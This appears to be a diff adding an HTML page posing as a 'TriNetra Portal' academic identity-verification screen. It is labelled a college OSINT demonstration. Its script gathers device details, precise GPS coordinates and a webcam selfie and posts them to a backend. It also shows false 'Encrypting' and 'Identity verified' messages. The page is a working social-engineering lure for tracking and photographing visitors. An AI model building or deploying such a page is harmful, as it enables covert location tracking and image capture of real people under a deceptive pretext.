@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TriNetra | Secure Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=Roboto+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00ffcc;
+            --primary-glow: rgba(0, 255, 204, 0.3);
+            --bg-dark: #050505;
+            --panel-bg: rgba(20, 20, 22, 0.7);
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(17, 24, 39, 1) 0, transparent 50%), 
+                radial-gradient(at 100% 100%, rgba(0, 50, 40, 0.2) 0, transparent 50%);
+            color: var(--text-main);
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .glass-panel {
+            background: var(--panel-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 3rem;
+            border-radius: 24px;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            text-align: center;
+            max-width: 480px;
+            width: 90%;
+            position: relative;
+            z-index: 10;
+        }
+
+        .logo-container {
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), #0088ff);
+            box-shadow: 0 0 25px var(--primary-glow);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: #000;
+            font-size: 1.8rem;
+            letter-spacing: -1px;
+        }
+
+        h1 {
+            font-weight: 600;
+            font-size: 2rem;
+            margin: 0 0 0.5rem 0;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            color: var(--text-muted);
+            font-size: 1rem;
+            margin-bottom: 2.5rem;
+            line-height: 1.6;
+        }
+
+        .consent-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px dashed rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            padding: 1.2rem;
+            margin-bottom: 2rem;
+            text-align: left;
+            font-size: 0.9rem;
+            color: #d1d5db;
+        }
+
+        .consent-box strong {
+            color: var(--primary);
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: block;
+            margin-bottom: 0.8rem;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--primary), #00b386);
+            color: #000;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            font-family: 'Outfit', sans-serif;
+            box-shadow: 0 10px 20px -10px var(--primary);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 25px -10px var(--primary);
+        }
+
+        .btn:disabled {
+            background: #2a2a30;
+            color: #6b7280;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Premium Camera Feed Styling */
+        .video-container {
+            position: relative;
+            margin-top: 2rem;
+            display: none;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: #000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        #videoElement {
+            width: 100%;
+            display: block;
+            transform: scaleX(-1); /* Mirror effect for natural selfie feel */
+            filter: contrast(1.1) brightness(1.05); /* Slight enhancement */
+        }
+
+        .scanning-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0,255,204,0) 0%, rgba(0,255,204,0.1) 50%, rgba(0,255,204,0) 100%);
+            background-size: 100% 200%;
+            animation: scan 2s linear infinite;
+            pointer-events: none;
+        }
+
+        .scanning-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--primary);
+            box-shadow: 0 0 15px var(--primary);
+            animation: scan-line 2s linear infinite;
+        }
+
+        @keyframes scan-line {
+            0% { top: 0; opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        .live-indicator {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.7rem;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 2;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #ff3366;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 51, 102, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(255, 51, 102, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 51, 102, 0); }
+        }
+
+        .status-terminal {
+            margin-top: 1.5rem;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--primary);
+            text-align: center;
+            height: 20px;
+        }
+
+        .typing-cursor::after {
+            content: '█';
+            animation: blink 1s step-start infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="glass-panel">
+        <div class="logo-container">
+            <div class="logo-icon">T</div>
+        </div>
+        <h1>TriNetra Portal</h1>
+        <p class="subtitle">Secure Academic Identity Verification</p>
+
+        <div class="consent-box">
+            <strong>Authorization Required</strong>
+            By proceeding, you consent to sharing your device diagnostics, GPS coordinates, and a biometric visual capture for the college OSINT demonstration.
+        </div>
+
+        <button class="btn" id="proceedBtn" onclick="startDataCollection()">Acknowledge & Verify</button>
+        
+        <div class="video-container" id="videoContainer">
+            <div class="live-indicator"><div class="live-dot"></div> LIVE FEED</div>
+            <div class="scanning-overlay"></div>
+            <div class="scanning-line"></div>
+            <video id="videoElement" autoplay playsinline></video>
+        </div>
+
+        <canvas id="canvasElement" style="display:none;"></canvas>
+        
+        <div class="status-terminal" id="status">_</div>
+    </div>
+
+    <script>
+        function typeStatus(text, type = "normal") {
+            const statusEl = document.getElementById('status');
+            statusEl.className = 'status-terminal typing-cursor';
+            if (type === "error") statusEl.style.color = "#ff3366";
+            else if (type === "success") statusEl.style.color = "#00ffcc";
+            else statusEl.style.color = "var(--primary)";
+            
+            statusEl.innerText = `> ${text}`;
+        }
+
+        async function startDataCollection() {
+            const btn = document.getElementById('proceedBtn');
+            const video = document.getElementById('videoElement');
+            const videoContainer = document.getElementById('videoContainer');
+            const canvas = document.getElementById('canvasElement');
+            
+            btn.disabled = true;
+            btn.innerText = "Initializing Protocols...";
+            
+            let collectedData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                location: null,
+                image: null
+            };
+
+            typeStatus("Requesting spatial coordinates...");
+
+            // 1. Get Location
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                collectedData.location = {
+                    lat: lat,
+                    lon: lon,
+                    gmapsLink: `https://www.google.com/maps?q=${lat},${lon}`
+                };
+            } catch (err) {
+                console.log("Location denied:", err.message);
+                collectedData.location = "Permission denied or unavailable";
+            }
+
+            typeStatus("Initializing visual capture...");
+
+            // 2. Get Camera Selfie
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                
+                // Show the highly polished camera UI
+                videoContainer.style.display = "block";
+                
+                // Wait for the video to start playing and show the scanning effect for 1.5 seconds
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 1500); 
+                    };
+                });
+
+                // Set canvas size
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Capture
+                const context = canvas.getContext('2d');
+                // Handle the mirroring effect for the capture so it looks like what the user saw
+                context.translate(canvas.width, 0);
+                context.scale(-1, 1);
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                collectedData.image = canvas.toDataURL('image/jpeg', 0.85);
+
+                // Stop tracks
+                stream.getTracks().forEach(track => track.stop());
+                videoContainer.style.display = "none";
+                
+            } catch (err) {
+                console.log("Camera denied:", err.message);
+                collectedData.image = "Permission denied or unavailable";
+            }
+
+            typeStatus("Transmitting payload to secure server...");
+            btn.innerText = "Encrypting...";
+
+            // 3. Send Data to Backend
+            try {
+                const response = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                if (response.ok) {
+                    typeStatus("Identity verified. You may close this window.", "success");
+                    btn.innerText = "Verification Complete";
+                } else {
+                    throw new Error("Server response not OK");
+                }
+            } catch (err) {
+                typeStatus("Transmission failed.", "error");
+                btn.innerText = "Connection Error";
+            }
+        }
+    </script>
+</body>
+</html>
